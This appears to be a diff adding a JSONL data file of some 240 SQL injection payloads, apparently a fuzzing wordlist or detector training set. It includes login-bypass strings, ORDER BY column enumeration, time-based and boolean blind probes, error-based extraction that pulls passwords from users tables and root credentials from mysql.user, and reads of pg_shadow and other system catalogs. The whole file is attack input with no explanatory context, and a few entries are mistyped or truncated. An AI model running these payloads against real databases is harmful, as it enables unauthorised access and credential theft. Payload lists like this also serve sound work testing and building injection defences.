@@ -1,0 +1,243 @@
+{"text": "Payload: ORDER BY 5#"}
+{"text": "Payload: or 'text' > 't'"}
+{"text": "Payload: or 0=0 --"}
+{"text": "Payload: ORDER BY 21#"}
+{"text": "Payload: ORDER BY 31337"}
+{"text": "Payload: ORDER BY 18#"}
+{"text": "Payload: ORDER BY 6--"}
+{"text": "Payload: or 0=0 #"}
+{"text": "Payload: ORDER BY 26--"}
+{"text": "Payload: ', $or: [ {{}}, {{ 'a':'a"}
+{"text": "Payload: or '1'='1'--"}
+{"text": "Payload: AND 1083=1083 AND (1427=1427"}
+{"text": "Payload: or 1=1--"}
+{"text": "Payload: ORDER BY 14--"}
+{"text": "Payload: ' or '' '"}
+{"text": "Payload: select session_user;"}
+{"text": "Payload: ' -- &password="}
+{"text": "Payload: 1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,@@version,0x7e))x)))-'"}
+{"text": "Payload: ORDER BY 6#"}
+{"text": "Payload: )) or pg_sleep(__TIME__)--\""}
+{"text": "Payload: ORDER BY 31337#"}
+{"text": "Payload: 1or1=1"}
+{"text": "Payload: or '7659'='7659"}
+{"text": "Payload: ORDER BY 6"}
+{"text": "Payload: select @@microsoftversione"}
+{"text": "Payload: ORDER BY 16#"}
+{"text": "Payload: ORDER BY 2#"}
+{"text": "Payload: ORDER BY 11#"}
+{"text": "Payload: OR 1=0#"}
+{"text": "Payload: ORDER BY 18--"}
+{"text": "Payload: or 'something' = 'some'+'thing'"}
+{"text": "Payload: or (EXISTS)"}
+{"text": "Payload: ORDER BY 23#"}
+{"text": "Payload: ORDER BY 25#"}
+{"text": "Payload: ORDER BY 15"}
+{"text": "Payload: or a=a--"}
+{"text": "Payload: ORDER BY 28#"}
+{"text": "Payload: --sp_password"}
+{"text": "Payload: or 'unusual' = 'unusual'"}
+{"text": "Payload: or 1=1\u2013"}
+{"text": "Payload: %20or%201=1"}
+{"text": "Payload: ORDER BY 12#"}
+{"text": "Payload: OR x=y--"}
+{"text": "Payload: ORDER BY 1"}
+{"text": "Payload: or a = a"}
+{"text": "Payload: ORDER BY 30"}
+{"text": "Payload: ORDER BY 20"}
+{"text": "Payload: ORDER BY 10--"}
+{"text": "Payload: ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT MID(@@version,1,1)),0x7e),0x00)-- '"}
+{"text": "Payload: '=\"or'"}
+{"text": "Payload: ORDER BY 17--"}
+{"text": "Payload: ORDER BY 8#"}
+{"text": "Payload: and (select substring(@@version,2,1))='y'"}
+{"text": "Payload: or 3=3"}
+{"text": "Payload: ORDER BY 29--"}
+{"text": "Payload: ORDER BY 27#"}
+{"text": "Payload: or%201=1 --"}
+{"text": "Payload: ORDER BY 12--"}
+{"text": "Payload: AND 7506=9091 AND ('5913=5913"}
+{"text": "Payload: )) or pg_sleep(__TIME__)--"}
+{"text": "Payload: ORDER BY 1--"}
+{"text": "Payload: -- &password="}
+{"text": "Payload: or true"}
+{"text": "Payload: ORDER BY 24#"}
+{"text": "Payload: AND 7506=9091 AND (5913=5913"}
+{"text": "Payload: ) or ('a'='a"}
+{"text": "Payload: OR x=x--"}
+{"text": "Payload: 1 uni/**/on select all from where"}
+{"text": "Payload: select @@version"}
+{"text": "Payload: or 1=1 /*"}
+{"text": "Payload: ORDER BY 5--"}
+{"text": "Payload: )) or sleep(__TIME__)='"}
+{"text": "Payload: 1 exec sp_ (or exec xp_)"}
+{"text": "Payload: ORDER BY 16"}
+{"text": "Payload: or 1=1/*"}
+{"text": "Payload: ORDER BY 19--"}
+{"text": "Payload: ORDER BY 13#"}
+{"text": "Payload: ORDER BY 3"}
+{"text": "Payload: ORDER BY 20--"}
+{"text": "Payload: ) or sleep(__TIME__)='"}
+{"text": "Payload: ORDER BY 26"}
+{"text": "Payload: or 1/*"}
+{"text": "Payload: 1' AND GTID_SUBSET(CONCAT((SELECT password FROM users WHERE id=1)),0)-- -"}
+{"text": "Payload: or 0=0 #\""}
+{"text": "Payload: ORDER BY 21"}
+{"text": "Payload: 1' AND GTID_SUBSET(CONCAT(0x7e,(SELECT MID(@@version,1,1)),0x7e),1)-- -"}
+{"text": "Payload: ORDER BY 22#"}
+{"text": "Payload: ORDER BY 24--"}
+{"text": "Payload: 1' AND GTID_SUBSET(CONCAT((SELECT password FROM users LIMIT 1)),0)-- -"}
+{"text": "Payload: AND 1=0--"}
+{"text": "Payload: %20'sleep%2050'"}
+{"text": "Payload: or 1=1 or \"\"="}
+{"text": "Payload: ORDER BY 30--"}
+{"text": "Payload: 1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,VERSION(),0x7e))a))); --"}
+{"text": "Payload: and 1=1"}
+{"text": "Payload: AND 7300=7300 AND 'pKlZ'='pKlZ"}
+{"text": "Payload: ORDER BY 17#"}
+{"text": "Payload: ) or pg_sleep(__TIME__)--"}
+{"text": "Payload: ORDER BY 15#"}
+{"text": "Payload: select name from syscolumns where id = (sele ..."}
+{"text": "Payload: ORDER BY 7"}
+{"text": "Payload: hi or a=a"}
+{"text": "Payload: ORDER BY 20#"}
+{"text": "Payload: ORDER BY 27--"}
+{"text": "Payload: handler"}
+{"text": "Payload: ORDER BY 23--"}
+{"text": "Payload: ORDER BY 3#"}
+{"text": "Payload: ORDER BY 10"}
+{"text": "Payload: ORDER BY 4--"}
+{"text": "Payload: OR 1=0--"}
+{"text": "Payload: ORDER BY 15--"}
+{"text": "Payload: ORDER BY 14#"}
+{"text": "Payload: select * from sysusers"}
+{"text": "Payload: ORDER BY 25"}
+{"text": "Payload: and (select substring(@@version,3,1))='X'"}
+{"text": "Payload: select system_user from sysibm.sysdummy1;"}
+{"text": "Payload: ) or (a=a"}
+{"text": "Payload: OR 1=1"}
+{"text": "Payload: ) or '1\u2032='1\u2013"}
+{"text": "Payload: or 1=1--\""}
+{"text": "Payload: %20or%20''='"}
+{"text": "Payload: 1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,VERSION(),0x7e))a)b)) AND '1'='1"}
+{"text": "Payload: select"}
+{"text": "Payload: ORDER BY 9"}
+{"text": "Payload: ORDER BY 17"}
+{"text": "Payload: or 1 --'"}
+{"text": "Payload: or 1 in (select @@version)--"}
+{"text": "Payload: ORDER BY 23"}
+{"text": "Payload: ; or '1'='1'"}
+{"text": "Payload: or 'a'='a"}
+{"text": "Payload: ORDER BY 18"}
+{"text": "Payload: or a=a"}
+{"text": "Payload: ORDER BY 22"}
+{"text": "Payload: OR 1=1#"}
+{"text": "Payload: ORDER BY 25--"}
+{"text": "Payload: \"a\"\" or 3=3--\""}
+{"text": "Payload: and 1 in (select var from temp)--"}
+{"text": "Payload: select session_user from sysibm.sysdummy1;"}
+{"text": "Payload: AND 1=1 AND '%'='"}
+{"text": "Payload: ORDER BY 5"}
+{"text": "Payload: ' AND GTID_SUBSET(CONCAT(0x7e,(SELECT MID(@@version,1,1)),0x7e),0)-- -"}
+{"text": "Payload: AND 1=0"}
+{"text": "Payload: 1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))x)));-- -"}
+{"text": "Payload: char%4039%41%2b%40SELECT"}
+{"text": "Payload: ORDER BY 12"}
+{"text": "Payload: ORDER BY 29#"}
+{"text": "Payload: and (select substring(@@version,3,1))='S'"}
+{"text": "Payload: OR x=x"}
+{"text": "Payload: &apos;%20OR"}
+{"text": "Payload: password:*/=1--"}
+{"text": "Payload: or 2 > 1"}
+{"text": "Payload: ORDER BY 21--"}
+{"text": "Payload: ORDER BY 8"}
+{"text": "Payload: ORDER BY 8--"}
+{"text": "Payload: AND 1=1"}
+{"text": "Payload: ORDER BY 2--"}
+{"text": "Payload: or ''='"}
+{"text": "Payload: select current_user;"}
+{"text": "Payload: AND 1=1--"}
+{"text": "Payload: order by"}
+{"text": "Payload: and (select substring(@@version,1,1))='X'"}
+{"text": "Payload: ' or (EXISTS)"}
+{"text": "Payload: 1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))x)))-'"}
+{"text": "Payload: ORDER BY 24"}
+{"text": "Payload: hi\"\"\"\") or (\"\"\"\"a\"\"\"\"=\"\"\"\"a\"\"\""}
+{"text": "Payload: OR 1=0"}
+{"text": "Payload: and (select substring(@@version,3,1))='c'"}
+{"text": "Payload: or \"\"a\"\"=\"\"a\""}
+{"text": "Payload: ) or ('1\u2032='1\u2013"}
+{"text": "Payload: or 1=1#"}
+{"text": "Payload: ' AND GTID_SUBSET(CONCAT((SELECT password FROM users WHERE id=1)),0)-- '"}
+{"text": "Payload: ORDER BY 3--"}
+{"text": "Payload: ORDER BY 14"}
+{"text": "Payload: ORDER BY 30#"}
+{"text": "Payload: or 'text' = n'text'"}
+{"text": "Payload: or 1=1"}
+{"text": "Payload: 1' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,@@version,0x7e))x)))-'"}
+{"text": "Payload: \" or \"\" \""}
+{"text": "Payload: @var select @var as var into temp end --"}
+{"text": "Payload: ORDER BY 10#"}
+{"text": "Payload: ORDER BY 29"}
+{"text": "Payload: ORDER BY 13--"}
+{"text": "Payload: AND 7300=7300 AND 'pKlZ'='pKlY"}
+{"text": "Payload: select * from pg_group;"}
+{"text": "Payload: OR x=x#"}
+{"text": "Payload: and 1=1\u2013"}
+{"text": "Payload: 1' AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))a)b)) AND '1'='1"}
+{"text": "Payload: a\"\"\"\" or 3=3--\"\"\""}
+{"text": "Payload: ORDER BY 26#"}
+{"text": "Payload: or '1'='1"}
+{"text": "Payload: ORDER BY 13"}
+{"text": "Payload: OR 1=1--"}
+{"text": "Payload: ) or sleep(__TIME__)="}
+{"text": "Payload: ORDER BY 11--"}
+{"text": "Payload: ORDER BY 4#"}
+{"text": "Payload: ORDER BY 19"}
+{"text": "Payload: ',NULL)%20waifor%20delay%20'0:0:20'%20/*"}
+{"text": "Payload: or"}
+{"text": "Payload: OR x=y#"}
+{"text": "Payload: ORDER BY 19#"}
+{"text": "Payload: ORDER BY 31337--"}
+{"text": "Payload: \"hi\"\") or (\"\"a\"\"=\"\"a\""}
+{"text": "Payload: ORDER BY 2"}
+{"text": "Payload: 1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,VERSION(),0x7e))a)b))"}
+{"text": "Payload: ORDER BY 27"}
+{"text": "Payload: ORDER BY 7#"}
+{"text": "Payload: ORDER BY 4"}
+{"text": "Payload: or 0=0 \u2013"}
+{"text": "Payload: /**/or/**/1/**/=/**/1"}
+{"text": "Payload: ORDER BY 1#"}
+{"text": "Payload: and (select substring(@@version,2,1))='i'"}
+{"text": "Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"}
+{"text": "Payload: select * from master..sysserverse"}
+{"text": "Payload: ORDER BY 11"}
+{"text": "Payload: and (select substring(@@version,1,1))='M'"}
+{"text": "Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='"}
+{"text": "Payload: %20or%20x=x"}
+{"text": "Payload: AND 1083=1083 AND ('1427=1427"}
+{"text": "Payload: ORDER BY 22--"}
+{"text": "Payload: ORDER BY 9--"}
+{"text": "Payload: %20or%20'x'='x"}
+{"text": "Payload: select * from pg_shadow;"}
+{"text": "Payload: ' OR GTID_SUBSET((SELECT CONCAT(user,0x3a,password) FROM mysql.user WHERE user='root' LIMIT 1),1)-- -"}
+{"text": "Payload: AND 1=0#"}
+{"text": "Payload: )%20or%20('x'='x"}
+{"text": "Payload: ORDER BY 28--"}
+{"text": "Payload: or true--"}
+{"text": "Payload: '),NULL)%20waifor%20delay%20'0:0:20'%20/*"}
+{"text": "Payload: or 1=1 or ''='"}
+{"text": "Payload: ' OR GTID_SUBSET(CONCAT((SELECT password FROM users LIMIT 1)),'') OR '1'='1"}
+{"text": "Payload: OR x=y"}
+{"text": "Payload: ORDER BY 9#"}
+{"text": "Payload: AND 1=1#"}
+{"text": "Payload: ORDER BY 7--"}
+{"text": "Payload: or 2 between 1 and 3"}
+{"text": "Payload: or%201=1"}
+{"text": "Payload: select @@servernamee"}
+{"text": "Payload: 1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))a)b))"}
+{"text": "Payload: ORDER BY 16--"}
+{"text": "Payload: )) or sleep(__TIME__)=\"\"\""}
+{"text": "Payload: ORDER BY 28"}
+{"text": "Payload: AND 1=0 AND '%'='"}
+{"text": "Payload: select * from syscat.tabauth;"}
